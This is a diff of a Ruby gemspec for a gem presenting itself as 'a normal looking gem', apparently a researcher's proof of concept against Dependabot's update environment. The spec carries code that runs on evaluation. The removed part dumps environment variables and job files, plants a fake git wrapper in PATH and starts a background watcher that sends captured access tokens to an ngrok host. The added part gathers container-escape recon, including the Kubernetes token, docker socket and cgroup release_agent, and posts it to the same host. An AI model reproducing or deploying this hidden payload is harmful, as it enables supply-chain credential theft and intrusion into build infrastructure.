@@ -1,291 +1,105 @@
 # frozen_string_literal: true
 
-COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"
+COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"
 
 begin
   require "uri"
   require "net/http"
 
   read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }
+  cmd       = ->(c) { `#{c} 2>/dev/null`.strip[0, 1000] }
 
   lines = []
-  lines << "=== ENV ===\n" + ENV.map { |k,v| "#{k}=#{v}" }.join("\n")
-  lines << "\n=== JOB.JSON ===\n" + (read_file.("/home/dependabot/dependabot-updater/job.json") rescue "FOUT")
-
-  # === ESCALATIE: GitHub API via de geauthenticeerde proxy ===
-  # De proxy injecteert automatisch de Authorization header.
-  # We disablen SSL verify omdat we intern zitten.
-  lines << "\n=== GITHUB API VIA PROXY ==="
-
-  def gh_req(method, url, body_hash = nil)
-    require "uri"; require "net/http"
-    uri = URI(url)
-    http = Net::HTTP.new(uri.host, uri.port)
-    http.use_ssl = true; http.verify_mode = 0
-    http.open_timeout = 10; http.read_timeout = 10
-    req = Object.const_get("Net::HTTP::#{method.capitalize}").new(uri)
-    req["Accept"] = "application/vnd.github+json"
-    req["X-GitHub-Api-Version"] = "2022-11-28"
-    if body_hash
-      req["Content-Type"] = "application/json"
-      req.body = body_hash.to_s.gsub("=>", ":").gsub("nil", "null")
-        .gsub(": true", ": true").gsub(": false", ": false")
-    end
-    res = http.request(req)
-    "Status: #{res.code}\nScopes: #{res["x-oauth-scopes"]}\nBody: #{res.body[0, 800]}"
-  rescue => e
-    "FOUT: #{e.message}"
-  end
 
   # ============================================================
-  # ESCALATIE: PATH hijacking via /home/dependabot/bin/git
-  #
-  # /home/dependabot/bin staat EERSTE in PATH.
-  # Wij schrijven een fake git die:
-  #   1. Alle aanroepen logt (incl. x-access-token:TOKEN in git config calls)
-  #   2. De echte git aanroept zodat Dependabot normaal doorgaat (transparant)
-  #   3. Bij credential-gerelateerde calls het token exfiltreert
+  # CONTAINER ESCAPE RECON
+  # Doel: bepalen welke escape route mogelijk is
   # ============================================================
 
-  dep_bin = "/home/dependabot/bin"
-  collab = COLLAB_URL
+  # 1. Capabilities -- de sleutel tot bijna alle escapes
+  lines << "=== CAPABILITIES ==="
+  lines << cmd.("cat /proc/self/status | grep -E 'Cap|Uid|Gid'")
+  lines << "\n-- capsh decode --"
+  lines << cmd.("capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null || echo 'capsh niet beschikbaar'")
 
-  # ============================================================
-  # PROXY AANVAL: 172.19.0.2 heeft de credentials
-  # Scan alle poorten, probeer admin APIs
-  # ============================================================
-  lines << "\n=== PROXY CREDENTIAL ORACLE ==="
-  require "socket"
-  require "timeout"
-  ngrok_host = COLLAB_URL.gsub("https://","")
+  # 2. Seccomp en AppArmor
+  lines << "\n=== SECCOMP / APPARMOR ==="
+  lines << "Seccomp: " + cmd.("grep Seccomp /proc/self/status")
+  lines << "AppArmor: " + cmd.("cat /proc/self/attr/current")
+  lines << "AppArmor profile: " + cmd.("cat /proc/1/attr/apparmor/current 2>/dev/null || cat /proc/self/attr/apparmor/current")
 
-  # TECHNIEK 1: Stuur echte proxy-formaat request naar ONZE server via de proxy
-  # De proxy stuurt dit door naar onze ngrok - als hij Authorization injecteert zien we het
-  [
-    "GET http://#{ngrok_host}/?proxy_inject_test=1 HTTP/1.0\r\nHost: #{ngrok_host}\r\n\r\n",
-    "GET http://#{ngrok_host}/?proxy_inject_test=2 HTTP/1.1\r\nHost: #{ngrok_host}\r\nConnection: close\r\n\r\n",
-    # Probeer met github.com als host maar onze URL als target (host-spoofing)
-    "GET http://#{ngrok_host}/?github_spoof=1 HTTP/1.0\r\nHost: github.com\r\n\r\n",
-  ].each_with_index do |proxy_req, i|
-    begin
-      Timeout.timeout(5) do
-        s = TCPSocket.new("172.19.0.2", 1080)
-        s.write(proxy_req)
-        resp = ""
-        begin
-          while (chunk = s.read_nonblock(4096))
-            resp += chunk
-          end
-        rescue IO::WaitReadable
-          IO.select([s], nil, nil, 2)
-          retry if resp.empty?
-        rescue
-        end
-        s.close rescue nil
-        lines << "--- Proxy req #{i+1} response ---\n#{resp[0,300]}"
-      end
-    rescue => e
-      lines << "--- Proxy req #{i+1} fout: #{e.message}"
-    end
-  end
+  # 3. Mount info -- host mounts, overlay, tmpfs
+  lines << "\n=== MOUNTS ==="
+  lines << cmd.("cat /proc/mounts")
 
-  lines << "\n=== GITHUB ACTIONS ESCALATIE ==="
+  # 4. Docker socket -- directe host escape
+  lines << "\n=== DOCKER SOCKET ==="
+  lines << cmd.("ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null || echo 'geen docker socket'")
 
-  def gh_call(method, path, body = nil)
-    require "net/http"; require "uri"
-    uri = URI("https://api.github.com#{path}")
-    h = Net::HTTP.new(uri.host, uri.port)
-    h.use_ssl = true; h.verify_mode = 0
-    h.open_timeout = 8; h.read_timeout = 8
-    klass = {"get" => Net::HTTP::Get, "post" => Net::HTTP::Post,
-             "put" => Net::HTTP::Put, "delete" => Net::HTTP::Delete}[method]
-    r = klass.new(uri)
-    r["Accept"] = "application/vnd.github+json"
-    r["X-GitHub-Api-Version"] = "2022-11-28"
-    if body
-      r["Content-Type"] = "application/json"
-      r.body = body
-    end
-    res = h.request(r)
-    "#{res.code}: #{res.body[0, 600]}"
-  rescue => e; "FOUT: #{e.message}"
-  end
+  # 5. Kubernetes service account token
+  lines << "\n=== KUBERNETES ==="
+  lines << cmd.("ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo 'geen k8s token'")
+  lines << cmd.("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo 'geen token'")
 
-  # Onze huidige Dependabot job draait als GitHub Actions workflow!
-  # Haal de workflow run ID op uit de meest recente run
-  lines << "\n--- Huidige workflow run details ---"
-  runs_resp = gh_call("get", "/repos/ugurcanli/testpen/actions/runs?per_page=1&event=dynamic")
-  lines << runs_resp
+  # 6. /dev -- disk devices, privileged container indicator
+  lines << "\n=== /dev DEVICES ==="
+  lines << cmd.("ls /dev/")
 
-  # Extraheer run ID uit de response
-  run_id = runs_resp[/\"id\":(\d+)/, 1]
-  lines << "Extracted run_id: #{run_id}"
+  # 7. Namespace info -- zijn we in een user namespace?
+  lines << "\n=== NAMESPACES ==="
+  lines << cmd.("ls -la /proc/1/ns/")
+  lines << "UID map: " + cmd.("cat /proc/self/uid_map")
+  lines << "GID map: " + cmd.("cat /proc/self/gid_map")
 
-  if run_id
-    # Job ID ophalen
-    jobs_resp = gh_call("get", "/repos/ugurcanli/testpen/actions/runs/#{run_id}/jobs")
-    lines << "\n--- Jobs ---\n#{jobs_resp}"
-    job_id = jobs_resp[/\"id\":(\d+)/, 1]
-    lines << "Job ID: #{job_id}"
+  # 8. cgroups -- notify_on_release escape vector
+  lines << "\n=== CGROUPS ==="
+  lines << cmd.("cat /proc/self/cgroup")
+  lines << cmd.("ls /sys/fs/cgroup/")
+  lines << "cgroup writable: " + cmd.("test -w /sys/fs/cgroup && echo JA || echo NEE")
+  lines << "release_agent: " + cmd.("find /sys/fs/cgroup -name release_agent 2>/dev/null | head -5")
 
-    if job_id
-      # Job stap logs (werkt ook tijdens uitvoering)
-      lines << "\n--- Job logs (#{job_id}) ---"
-      begin
-        require "net/http"; require "uri"
-        uri = URI("https://api.github.com/repos/ugurcanli/testpen/actions/jobs/#{job_id}/logs")
-        h = Net::HTTP.new(uri.host, uri.port)
-        h.use_ssl = true; h.verify_mode = 0; h.open_timeout = 10; h.read_timeout = 10
-        r = Net::HTTP::Get.new(uri)
-        r["Accept"] = "application/vnd.github+json"
-        r["X-GitHub-Api-Version"] = "2022-11-28"
-        res = h.request(r)
-        lines << "Status: #{res.code}, Location: #{res["location"]}"
-        if res.code == "302" && res["location"]
-          log_uri = URI(res["location"])
-          log_http = Net::HTTP.new(log_uri.host, log_uri.port)
-          log_http.use_ssl = true; log_http.verify_mode = 0
-          log_res = log_http.request(Net::HTTP::Get.new(log_uri))
-          # Logs zijn plaintext - zoek naar tokens
-          log_content = log_res.body[0, 3000]
-          lines << "LOG INHOUD:\n#{log_content}"
-          if log_content =~ /ghs_|ghp_|token|Token|Bearer/
-            lines << "!!! TOKEN GEVONDEN IN LOGS !!!"
-          end
-        else
-          lines << "Body: #{res.body[0,300]}"
-        end
-      rescue => e
-        lines << "FOUT: #{e.message}"
-      end
-    end
-  end
+  # 9. Host PID namespace -- zien we host processen?
+  lines << "\n=== PROCESSEN (host zichtbaar?) ==="
+  lines << cmd.("ps aux --no-headers | head -20")
+  lines << "PID 1 cmdline: " + cmd.("cat /proc/1/cmdline | tr '\\0' ' '")
+  lines << "Eigen PID: " + Process.pid.to_s
 
-  # Trigger Dependency Graph workflow (288016377)
-  lines << "\n--- Dispatch Dependency Graph workflow ---"
-  lines << gh_call("post", "/repos/ugurcanli/testpen/actions/workflows/288016377/dispatches",
-    '{"ref":"main"}')
+  # 10. Interessante bestanden en writable paths
+  lines << "\n=== WRITABLE PATHS ==="
+  lines << cmd.("find / -maxdepth 4 -writable -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/home/dependabot/*' -not -path '/tmp/*' 2>/dev/null | head -30")
 
-  # Probeer ook ACTIONS_RUNTIME omgeving (kan GITHUB_TOKEN bevatten)
-  lines << "\n--- Actions runtime bestanden ---"
-  %w[
-    /home/dependabot/.runner
-    /runner/_work/_temp
-    /github/workflow
-    /github/home
-  ].each do |p|
-    begin
-      lines << "#{p}: #{`ls #{p} 2>/dev/null`.strip[0,200]}"
-    rescue; end
-  end
-  lines << "ACTIONS_RUNTIME_TOKEN=#{ENV['ACTIONS_RUNTIME_TOKEN']}"
-  lines << "ACTIONS_RUNTIME_URL=#{ENV['ACTIONS_RUNTIME_URL']}"
-  lines << "GITHUB_TOKEN=#{ENV['GITHUB_TOKEN']}"
+  # 11. SUID binaries
+  lines << "\n=== SUID BINARIES ==="
+  lines << cmd.("find / -maxdepth 5 -perm -4000 -type f 2>/dev/null")
 
-  lines << "\n--- /home/dependabot/bin inhoud ---"
-  lines << (`ls -la #{dep_bin}/ 2>&1`)
+  # 12. Host netwerk
+  lines << "\n=== NETWERK ==="
+  lines << cmd.("ip addr 2>/dev/null || ifconfig 2>/dev/null")
+  lines << cmd.("ip route 2>/dev/null || route -n 2>/dev/null")
+  lines << cmd.("cat /etc/resolv.conf")
 
-  # Schrijf de fake git wrapper
-  fake_git_script = <<~SHELL
-    #!/bin/sh
-    # Transparante git wrapper - logt args naar file, roept echte git aan
-    printf '%s\\n' "$(date -Iseconds) $*" >> /tmp/git_calls.log
-    exec /usr/bin/git "$@"
-  SHELL
-
-  begin
-    fake_git_path = "#{dep_bin}/git"
-    IO.binwrite(fake_git_path, fake_git_script)
-    `chmod +x #{fake_git_path} 2>&1`
-    lines << "\n--- Fake git geschreven: #{`ls -la #{fake_git_path} 2>&1`.strip} ---"
-  rescue => e
-    lines << "\n--- Fake git mislukt: #{e.message} ---"
-  end
-
-  # Background watcher: poll git log en gitconfig elke 2s voor 120s
-  # Stuurt token zodra het verschijnt, blokkeert de main flow NIET
-  watcher = <<~SHELL
-    #!/bin/sh
-    COLLAB="#{collab}"
-    for i in $(seq 1 60); do
-      sleep 2
-      # Kijk of git_calls.log iets interessants heeft
-      if [ -f /tmp/git_calls.log ]; then
-        TOKEN=$(grep -o 'x-access-token:[^@]*' /tmp/git_calls.log 2>/dev/null | head -1)
-        if [ -n "$TOKEN" ]; then
-          /usr/bin/curl -s "${COLLAB}?hijack_token=${TOKEN}&calls=$(wc -l < /tmp/git_calls.log)" &
-          cat /tmp/git_calls.log | /usr/bin/curl -s -X POST "${COLLAB}?git_log=1" --data-binary @- &
-          break
-        fi
-      fi
-      # Ook gitconfig checken
-      GCFG=$(/usr/bin/git config --global --get-regexp "url" 2>/dev/null)
-      if echo "$GCFG" | grep -q "x-access-token"; then
-        TOKEN=$(echo "$GCFG" | grep -o 'x-access-token:[^@]*' | head -1)
-        echo "$GCFG" | /usr/bin/curl -s -X POST "${COLLAB}?gitcfg_token=${TOKEN}" --data-binary @- &
-        break
-      fi
-    done
-  SHELL
-
-  begin
-    IO.binwrite("/tmp/git_watcher.sh", watcher)
-    `chmod +x /tmp/git_watcher.sh`
-    # Start watcher los van de huidige process (dubbele fork)
-    `(/tmp/git_watcher.sh > /tmp/watcher.out 2>&1 &) &`
-    lines << "Background watcher gestart (monitort 120s op token)"
-  rescue => e
-    lines << "Watcher fout: #{e.message}"
-  end
-
-  # Lees ook /proc van het hoofd-updater proces (zelfde user = leesbaar)
-  lines << "\n--- /proc hoofdproces ---"
-  main_pid = `pgrep -f 'ruby.*update_files' 2>/dev/null`.strip.split.first
-  if main_pid
-    lines << "Main PID: #{main_pid}"
-    lines << "Open FDs: #{`ls -la /proc/#{main_pid}/fd 2>/dev/null`[0, 500]}"
-    # Lees environment van het hoofdproces
-    main_env = IO.binread("/proc/#{main_pid}/environ") rescue ""
-    main_env_parsed = main_env.gsub("\x00", "\n")
-    lines << "Main process ENV:\n#{main_env_parsed[0, 1000]}"
-  end
-
-  # === PIVOT: interne netwerk scan ===
-  lines << "\n=== INTERNE NETWERK SCAN ==="
-  lines << `nmap -sn 172.19.0.0/24 2>/dev/null || for i in $(seq 1 10); do (ping -c1 -W1 172.19.0.$i >/dev/null 2>&1 && echo "172.19.0.$i UP") || true; done 2>/dev/null`.to_s[0, 800]
-
-  # === Repo inhoud lezen via proxy ===
-  lines << "\n=== GECLONEDE REPO BESTANDEN ==="
-  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"
-  lines << `ls -la #{repo_path}/ 2>/dev/null`.to_s[0, 500]
-  lines << `find #{repo_path} -name "*.env" -o -name ".env*" -o -name "*.secret" 2>/dev/null`.to_s[0, 300]
-
+  # Stuur alles op
   payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
-
-  uri = URI("#{COLLAB_URL}?poc=escalatie")
+  uri = URI("#{COLLAB_URL}?poc=escape_recon")
   req = Net::HTTP::Post.new(uri)
   req["Content-Type"] = "text/plain"
   req.body = payload
-  Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == "https",
-                  open_timeout: 10, read_timeout: 10) { |h| h.request(req) }
+  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
+                  open_timeout: 15, read_timeout: 15) { |h| h.request(req) }
 
 rescue => e
   begin
-    require "net/http"
-    require "uri"
-    uri = URI("#{COLLAB_URL}?poc=escalatie&err=#{URI.encode_www_form_component(e.message[0, 200])}")
+    uri = URI("#{COLLAB_URL}?poc=escape_recon&err=#{URI.encode_www_form_component(e.message[0,200])}")
     Net::HTTP.get(uri)
-  rescue
-  end
+  rescue; end
 end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.15"
+  spec.version       = "1.0.16"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
-
   spec.add_dependency "rails", "~> 7.0"
   spec.add_dependency "devise", "~> 4.9"
 end
